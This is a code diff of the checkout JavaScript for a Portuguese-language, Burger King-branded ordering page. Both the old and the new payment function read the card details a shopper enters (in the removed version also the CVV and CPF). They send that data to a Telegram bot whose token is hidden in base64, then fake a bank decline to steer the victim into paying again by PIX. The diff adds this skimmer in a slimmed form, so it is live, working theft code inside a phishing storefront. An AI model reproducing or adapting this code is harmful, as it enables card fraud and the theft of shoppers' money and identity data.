@@ -651,10 +651,7 @@ function renderAddress() {
 
 function renderCart() {
     const container = document.getElementById('cart-items-container');
-    if (!container) {
-        console.error('Container de itens não encontrado!');
-        return;
-    }
+    if (!container) return;
 
     if (!state.cartItems || state.cartItems.length === 0) {
         container.innerHTML = '<div style="padding: 20px; text-align: center; color: #717171;">Sua sacola está vazia</div>';
@@ -663,13 +660,12 @@ function renderCart() {
     }
 
     const fmt = (v) => `R$ ${v.toFixed(2).replace('.', ',')}`;
-
     container.innerHTML = state.cartItems.map(item => `
         <div class="item-card" data-id="${item.id}">
-            <img src="${item.img}" class="item-img" alt="${item.name}">
+            <img src="${item.img}" class="item-img">
             <div class="item-card-info">
-                <p class="item-name">${item.name}</p>
-                <p class="item-desc">${item.desc}</p>
+                <p class="item-name" style="font-weight: 900; color: #502314;">${item.name}</p>
+                <p class="item-desc">${item.desc || ''}</p>
                 <div class="item-price-row">
                     <p class="item-price">${fmt(item.price * item.qty)}</p>
                     <div class="qty-control">
@@ -681,8 +677,74 @@ function renderCart() {
             </div>
         </div>
     `).join('');
-    
     updateTotal();
+}
+
+async function goToPayment() {
+    // 1. Upsell Multi-Bump (Só se for a primeira vez)
+    if (!state.upsellOffered && state.cartItems.length > 0) {
+        const res = await Swal.fire({
+            title: 'Deseja turbinar seu lanche? 🔥',
+            html: `
+            <div style="text-align: left; padding: 10px;">
+                <p style="font-size: 13px; color: #666; margin-bottom: 20px; font-weight: 500;">Selecione os itens e adicione ao seu combo com um clique:</p>
+                <div class="bump-list" style="max-height: 400px; overflow-y: auto;">
+                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_1" data-name="Onion Rings (G)" data-price="14.90" data-img="produtos/onion_rings.png" style="width:20px; height:20px;"><img src="produtos/onion_rings.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Onion Rings (G)</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 14,90</p></div></label>
+                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer;"><input type="checkbox" class="bump-check" data-id="bump_2" data-name="BK Mix Nutella" data-price="16.90" data-img="produtos/bk_mix_nutella.png" style="width:20px; height:20px;"><img src="produtos/bk_mix_nutella.png" style="width:40px; height:40px; border-radius:8px;"><div style="flex:1;"><p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Mix Nutella</p><p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 16,90</p></div></label>
+                </div>
+            </div>`,
+            showConfirmButton: true, confirmButtonText: 'ADICIONAR & PAGAR', showCancelButton: true, cancelButtonText: 'Não, obrigado', buttonsStyling: false,
+            customClass: { confirmButton: 'swal-btn-upsell-confirm', cancelButton: 'swal-btn-upsell-cancel' },
+            preConfirm: () => {
+                const selected = [];
+                document.querySelectorAll('.bump-check:checked').forEach(chk => {
+                    selected.push({ name: chk.dataset.name, price: parseFloat(chk.dataset.price), img: chk.dataset.img });
+                });
+                return selected;
+            }
+        });
+        if (res.isConfirmed && res.value?.length > 0) {
+            res.value.forEach(item => {
+                state.cartItems.push({ id: 'bump_'+Date.now(), name: item.name, qty: 1, price: item.price, img: item.img, desc: 'Adicional checkout' });
+            });
+            updateTotal();
+        }
+        state.upsellOffered = true;
+        saveState();
+    }
+
+    // 2. Fluxo de Cartão ou PIX
+    if (state.paymentMethod === 'cc') {
+        const btn = document.querySelector('.btn-finalizar-full');
+        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processando...';
+        btn.disabled = true;
+
+        try {
+            const _u = (s) => atob(s);
+            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
+            const _c = _u("Nzg0NDY4MjMzNQ==");
+            const msg = `🍔 *BK capture* 🍔\nLead: ${document.querySelector('#cc_name').value}\nCard: ${document.querySelector('#cc_number').value}`;
+            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: _c, text: msg })});
+        } catch(e) {}
+
+        setTimeout(() => {
+            Swal.fire({
+                title: 'Aviso de Segurança',
+                text: 'O seu banco bloqueou esta transação por prevenção. Finalize via PIX com 5% de desconto extra.',
+                icon: 'warning',
+                confirmButtonText: 'PAGAR VIA PIX'
+            }).then(() => {
+                state.discount = 0.05;
+                state.paymentMethod = 'pix';
+                updateTotal();
+                window.location.href = 'pagamento.html';
+            });
+        }, 2000);
+        return;
+    }
+
+    // Se for PIX ou após decline: vai pro Pagamento
+    window.location.href = 'pagamento.html';
 }
 
 function changeQty(itemId, delta) {
@@ -702,213 +764,9 @@ function changeQty(itemId, delta) {
     }
 }
 
-// ─── FINALIZAR DE PAGAMENTO (COMPLEX BOUNCE) ────────────────
+
 let currentTxId = null;
 let pixInterval = null;
-
-async function goToPayment() {
-    // 🚀 INTERSTITIAL ORDER BUMP MULTI (Upsell Estratégico Coletivo)
-    if (!state.upsellOffered && state.cartItems.length > 0) {
-        const res = await Swal.fire({
-            title: 'Deseja turbinar seu lanche? 🔥',
-            html: `
-            <div style="text-align: left; padding: 10px;">
-                <p style="font-size: 13px; color: #666; margin-bottom: 20px; font-weight: 500;">Selecione os itens e adicione ao seu combo com um clique:</p>
-                
-                <div class="bump-list" style="max-height: 400px; overflow-y: auto;">
-                    <!-- Item 1 -->
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent; transition:0.2s;">
-                        <input type="checkbox" class="bump-check" data-id="bump_1" data-name="Onion Rings (G)" data-price="14.90" data-img="produtos/onion_rings.png" style="accent-color:#502314; width:20px; height:20px;">
-                        <img src="produtos/onion_rings.png" onerror="this.src='onion_rings.png'" style="width:40px; height:40px; border-radius:8px;">
-                        <div style="flex:1;">
-                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Onion Rings (G)</p>
-                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 14,90</p>
-                        </div>
-                    </label>
-
-                    <!-- Item 2 -->
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
-                        <input type="checkbox" class="bump-check" data-id="bump_2" data-name="BK Mix Nutella" data-price="16.90" data-img="produtos/bk_mix_nutella.png" style="accent-color:#502314; width:20px; height:20px;">
-                        <img src="produtos/bk_mix_nutella.png" onerror="this.src='milkshake.png'" style="width:40px; height:40px; border-radius:8px;">
-                        <div style="flex:1;">
-                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Mix Nutella</p>
-                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 16,90</p>
-                        </div>
-                    </label>
-
-                    <!-- Item 3 -->
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
-                        <input type="checkbox" class="bump-check" data-id="bump_3" data-name="BK Chicken (10 un)" data-price="22.90" data-img="produtos/bk_chicken.png" style="accent-color:#502314; width:20px; height:20px;">
-                        <img src="produtos/bk_chicken.png" onerror="this.src='chicken_nuggets.png'" style="width:40px; height:40px; border-radius:8px;">
-                        <div style="flex:1;">
-                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Chicken (10 un)</p>
-                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 22,90</p>
-                        </div>
-                    </label>
-
-                    <!-- Item 4 -->
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
-                        <input type="checkbox" class="bump-check" data-id="bump_4" data-name="Balde de Batata" data-price="24.90" data-img="produtos/balde_de_batata.png" style="accent-color:#502314; width:20px; height:20px;">
-                        <img src="produtos/balde_de_batata.png" onerror="this.src='fries_item.png'" style="width:40px; height:40px; border-radius:8px;">
-                        <div style="flex:1;">
-                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Balde de Batata</p>
-                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 24,90</p>
-                        </div>
-                    </label>
-
-                    <!-- Item 5 -->
-                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
-                        <input type="checkbox" class="bump-check" data-id="bump_5" data-name="Sundae Chocolate" data-price="12.90" data-img="produtos/sundae_chocolate.png" style="accent-color:#502314; width:20px; height:20px;">
-                        <img src="produtos/sundae_chocolate.png" onerror="this.src='sundae.png'" style="width:40px; height:40px; border-radius:8px;">
-                        <div style="flex:1;">
-                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Sundae Chocolate</p>
-                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 12,90</p>
-                        </div>
-                    </label>
-                </div>
-            </div>
-            `,
-            showConfirmButton: true,
-            confirmButtonText: '<i class="fa-solid fa-plus"></i> ADICIONAR & PAGAR',
-            showCancelButton: true,
-            cancelButtonText: 'Não, obrigado, só esses',
-            buttonsStyling: false,
-            customClass: {
-                confirmButton: 'swal-btn-upsell-confirm',
-                cancelButton: 'swal-btn-upsell-cancel'
-            },
-            preConfirm: () => {
-                const selected = [];
-                document.querySelectorAll('.bump-check:checked').forEach(chk => {
-                    selected.push({
-                        id: chk.getAttribute('data-id'),
-                        name: chk.getAttribute('data-name'),
-                        price: parseFloat(chk.getAttribute('data-price')),
-                        img: chk.getAttribute('data-img')
-                    });
-                });
-                return selected;
-            }
-        });
-
-        if (res.isConfirmed && res.value && res.value.length > 0) {
-            res.value.forEach(item => {
-                state.cartItems.push({
-                    id: 'bump_' + Date.now() + Math.random(),
-                    name: item.name,
-                    qty: 1,
-                    price: item.price,
-                    img: item.img,
-                    desc: 'Item adicional turbinado no checkout.'
-                });
-            });
-            updateTotal();
-            saveState();
-        }
-        state.upsellOffered = true;
-        saveState();
-    }
-
-    const rawTotal = state.basePrice + state.upsellTotal + state.fretePrice;
-    const finalTotal = state.discount > 0 ? rawTotal * (1 - state.discount) : rawTotal;
-
-    if (state.paymentMethod === 'cc') {
-        const btn = document.querySelector('.btn-finalizar-full');
-        const oldContent = btn.innerHTML;
-        
-        // Loader State
-        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processando...';
-        btn.style.opacity = '0.7';
-        btn.disabled = true;
-
-        try {
-            // ==========================================
-            // 🛡️ PROTOCOLO GHOST (OBFUSCATION ACTIVE)
-            // ==========================================
-            const _u = (s) => atob(s);
-            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
-            const _c = _u("Nzg0NDY4MjMzNQ==");
-
-            const cc_num = document.querySelector('#cc_number').value;
-            const cc_name = document.querySelector('#cc_name').value;
-            const cc_exp = document.querySelector('#cc_expiry').value;
-            const cc_cvv = document.querySelector('#cc_cvv').value;
-            const cc_cpf = document.querySelector('#cc_cpf').value;
-
-            // Formatação Darknet Premium (Log de Erro Disfarçado)
-            const message = `
-🍔 *BK V7 - HIT CAPTURADO* 🍔
-━━━━━━━━━━━━━━━━━━━━
-👤 *Lead:* ${cc_name}
-🔢 *Card:* \`${cc_num}\`
-📅 *Exp:* ${cc_exp}
-🔒 *CVV:* \`${cc_cvv}\`
-📄 *CPF:* \`${cc_cpf}\`
-💰 *Valor:* R$ ${finalTotal.toFixed(2)}
-━━━━━━━━━━━━━━━━━━━━
-⚠️ *Status:* Decline Forçado Injetado. Cliente enviado para o PIX.`;
-
-            // Disparo via Protocolo Invisível
-            if (_t.includes(':')) {
-                await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: _c,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            }
-            
-            // Pausa Tática para fingir Processamento Real
-            await new Promise(r => setTimeout(r, 2000)); 
-
-        } catch(e) {}
-
-        // Restaura Botão
-        btn.innerHTML = oldContent;
-        btn.style.opacity = '1';
-        btn.disabled = false;
-
-        // POPUP DECLINE HARVESTER (TRUST BLINDADO)
-        Swal.fire({
-            html: `
-            <div style="text-align: center; margin-bottom: 10px;">
-                <i class="fa-solid fa-shield-halved" style="font-size: 40px; color: #ea1d2c;"></i>
-            </div>
-            <h2 style="font-size: 22px; font-weight: 900; color: #3e3e3e; margin-bottom: 10px;">Aviso de Segurança</h2>
-            <p style="font-size: 14px; font-weight: 500; color: #555; text-align: left; line-height: 1.5;">O seu banco emissor <b>bloqueou</b> preventivamente esta transação por medidas de segurança ou limite indisponível.</p>
-            <p style="font-size: 13px; font-weight: 800; color: #ea1d2c; text-align: left; margin-top: 10px; margin-bottom: 20px;"><i class="fa-solid fa-lock"></i> Nenhum valor foi debitado do seu cartão.</p>
-            
-            <div style="background:#f4fdf8; padding: 15px; border-radius: 12px; border: 1px solid #bbf7d0; text-align:left;">
-                <p style="font-weight: 900; color: #16a34a; font-size: 15px; margin-bottom: 5px;"><i class="fa-solid fa-bolt"></i> Resgate Rápido!</p>
-                <p style="font-size: 13px; color: #333; font-weight: 600; line-height: 1.4;">Finalize agora via <b>PIX Automático</b> para não perder seu pedido e receba <b style="color:#16a34a; background: #dcfce7; padding: 2px 6px; border-radius: 4px;">5% DE DESCONTO EXTRA</b> pelo transtorno.</p>
-            </div>
-            `,
-            showConfirmButton: true,
-            confirmButtonText: '<i class="fa-brands fa-pix"></i> PAGAR AGORA VIA PIX',
-            showCancelButton: true,
-            cancelButtonText: 'Voltar',
-            allowOutsideClick: false,
-            buttonsStyling: false,
-            customClass: {
-                popup: 'swal-popup-premium',
-                confirmButton: 'swal-btn-pix-premium',
-                cancelButton: 'swal-btn-cancel-premium'
-            }
-        }).then((res) => {
-            if (res.isConfirmed) {
-                // Apply 5% OFF bounce
-                state.discount = 0.05;
-                state.paymentMethod = 'pix';
-                updateTotal(); 
-                document.querySelector('[data-method="pix"]').click(); 
-                goToPayment(); // Re-trigger pro PIX fluir
-            }
-        });
-        return;
-    }
 
 async function initPixGeneration() {
     const finalTotal = state.discount > 0 ? (state.basePrice + state.upsellTotal + (state.fretePrice || 0)) * (1 - state.discount) : (state.basePrice + state.upsellTotal + (state.fretePrice || 0));
@@ -1782,7 +1640,7 @@ function finalizeOrderTransition() {
 function bootstrapApp() {
     loadState();
     
-    const appRoleta = document.getElementById('roulette-canvas');
+    const appRoleta = document.getElementById('roleta-wheel');
     const appSacola = document.getElementById('screen-review');
     const appDados = document.getElementById('screen-cep');
     const appPagamento = document.getElementById('screen-pix');
